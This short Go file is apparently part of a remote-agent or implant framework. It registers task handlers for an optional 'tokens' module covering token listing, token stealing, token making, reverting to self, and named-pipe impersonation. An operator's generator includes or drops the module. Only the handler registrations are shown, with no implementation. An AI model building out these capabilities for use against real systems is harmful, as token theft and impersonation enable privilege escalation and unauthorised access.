//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Task registry: the optional "tokens" module (see internal/payload/agent_modules.go).
// The generator drops this file whole when the operator excludes the module;
// every entry point below disappears with it and the linker dead-codes the
// unreferenced handlers.

func init() {
	taskHandlers["token_list_procs"] = handleTokenListProcs
	taskHandlers["token_steal"] = handleTokenSteal
	taskHandlers["token_make"] = handleTokenMake
	taskHandlers["token_revert"] = handleTokenRevert
	taskHandlers["rev2self"] = handleTokenRevert
	taskHandlers["token_whoami"] = handleTokenWhoami
	taskHandlers["named_pipe_impersonate"] = handleNamedPipeImpersonate
}
